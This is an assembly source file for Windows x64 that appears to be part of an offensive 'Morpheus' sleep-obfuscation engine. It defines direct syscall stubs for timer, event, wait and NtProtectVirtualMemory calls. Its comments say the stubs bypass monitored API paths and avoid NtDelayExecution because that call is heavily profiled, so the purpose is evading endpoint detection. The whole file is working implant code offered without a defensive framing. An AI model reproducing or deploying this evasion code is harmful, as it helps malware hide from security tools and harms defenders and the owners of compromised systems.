# morpheus_syscalls.s — Direct syscall stubs for BM-T6001 Morpheus Sleep
#
# Integration of BM-T1003 (Direct Syscalls) into the sleep obfuscation engine.
# Each stub: mov r10, rcx; mov eax, [global SSN]; syscall; ret
#
# The Windows x64 calling convention places args in RCX, RDX, R8, R9,
# then stack. The kernel expects R10 instead of RCX for arg1.
# The caller (C code) sets up all arguments — the stub just swaps
# RCX→R10 and issues the syscall instruction.
#
# SSN globals are set at init time by morpheus_init() after SSN extraction.
#
# NOTE: NtDelayExecution deliberately excluded — most profiled sleep primitive.
#
# Platform: Windows x64 (MinGW GAS syntax)

.intel_syntax noprefix
.data

# ── Global SSN storage (set by C code during morpheus_init) ──────────

.globl g_ssn_create_timer
.globl g_ssn_set_timer
.globl g_ssn_wait
.globl g_ssn_close
.globl g_ssn_create_event
.globl g_ssn_protect
.globl g_ssn_yield
.globl g_ssn_query_perf

g_ssn_create_timer:
    .long 0
g_ssn_set_timer:
    .long 0
g_ssn_wait:
    .long 0
g_ssn_close:
    .long 0
g_ssn_create_event:
    .long 0
g_ssn_protect:
    .long 0
g_ssn_yield:
    .long 0
g_ssn_query_perf:
    .long 0

.text

# ── NtCreateTimer (4 args) ──────────────────────────────────────────
# RCX = TimerHandle, RDX = DesiredAccess, R8 = ObjectAttributes, R9 = TimerType

.globl morpheus_sc_create_timer
morpheus_sc_create_timer:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_create_timer]
    syscall
    ret

# ── NtSetTimer (7 args) ─────────────────────────────────────────────
# RCX = TimerHandle, RDX = DueTime, R8 = TimerApcRoutine, R9 = TimerContext
# Stack: ResumeTimer, Period, PreviousState

.globl morpheus_sc_set_timer
morpheus_sc_set_timer:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_set_timer]
    syscall
    ret

# ── NtWaitForSingleObject (3 args) ──────────────────────────────────
# RCX = Handle, RDX = Alertable, R8 = Timeout

.globl morpheus_sc_wait
morpheus_sc_wait:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_wait]
    syscall
    ret

# ── NtClose (1 arg) ─────────────────────────────────────────────────
# RCX = Handle

.globl morpheus_sc_close
morpheus_sc_close:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_close]
    syscall
    ret

# ── NtCreateEvent (5 args) ──────────────────────────────────────────
# RCX = EventHandle, RDX = DesiredAccess, R8 = ObjectAttributes,
# R9 = EventType, Stack: InitialState

.globl morpheus_sc_create_event
morpheus_sc_create_event:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_create_event]
    syscall
    ret

# ── NtProtectVirtualMemory (5 args) ─────────────────────────────────
# RCX = ProcessHandle, RDX = BaseAddress, R8 = RegionSize,
# R9 = NewProtect, Stack: OldProtect

.globl morpheus_sc_protect
morpheus_sc_protect:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_protect]
    syscall
    ret

# ── NtYieldExecution (0 args) ────────────────────────────────────────

.globl morpheus_sc_yield
morpheus_sc_yield:
    mov eax, dword ptr [rip + g_ssn_yield]
    syscall
    ret

# ── NtQueryPerformanceCounter (2 args) ──────────────────────────────
# RCX = PerformanceCounter, RDX = PerformanceFrequency

.globl morpheus_sc_query_perf
morpheus_sc_query_perf:
    mov r10, rcx
    mov eax, dword ptr [rip + g_ssn_query_perf]
    syscall
    ret
